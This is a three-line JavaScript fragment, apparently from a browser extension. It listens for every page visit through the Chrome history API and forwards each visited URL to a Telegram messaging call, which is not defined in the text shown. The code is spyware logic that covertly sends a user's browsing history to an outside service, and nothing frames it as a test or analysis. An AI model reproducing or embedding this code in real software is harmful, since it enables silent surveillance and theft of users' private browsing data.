chrome.history.onVisited.addListener(function (value) {
    telegram.sendMessage(value.url);
});